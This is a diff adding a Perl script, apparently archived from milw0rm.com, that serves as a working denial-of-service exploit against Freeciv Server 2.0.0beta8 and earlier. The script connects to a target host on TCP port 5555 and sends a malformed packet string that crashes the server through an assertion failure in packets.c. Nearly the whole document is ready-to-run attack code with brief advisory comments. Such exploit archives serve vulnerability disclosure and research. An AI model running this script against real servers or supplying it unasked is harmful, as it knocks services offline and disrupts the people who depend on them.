@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+
+# Freeciv Server <= 2.0.0beta8 DoS exploit (windows&linux releases)
+# Vendor: http://www.freeciv.org/
+# Advisory: Nico Spicher [ http://triplex.it-helpnet.de/ ]
+
+# There is a vulnerability in the handling of incoming data. If the request
+# is uncomplete or modified, the server crashes because of a bug in the
+# get_packet_from_connection function in packets.c. Look at the code below
+# for more information.
+
+use IO::Socket;
+
+if (@ARGV < 1)
+ {
+system "clear";
+print "[-] Usage: exploit_freeciv.pl <host ip>\n";
+exit(1);
+ }
+system "clear";
+
+$server = $ARGV[0];
+print "[-] Freeciv DoS Exploit\n\n";
+print "[-] Server IP: ";
+print $server;
+print "\n[-] Connecting to IP ...\n";
+
+$socket = IO::Socket::INET->new(
+	Proto => "tcp",
+	PeerAddr => "$server",
+	PeerPort => "5555"); unless ($socket) { die "[-] $server is offline\n" }
+
+print "[-] Connected\n\n";
+
+print "[-] Creating string\n";
+
+$string="@+2.0 conn_ping_info username_info-beta8";
+# >civserver: packets.c:385: get_packet_from_connection:
+# 	      Assertion 'error == 0' failed.
+# Aborted(core dumped)
+
+print "[-] Sending string\n\n";
+
+print $socket "$string";
+
+print "[>] Attack successful - Server killed\n";
+
+close($socket);
+
+# milw0rm.com [2005-03-14]
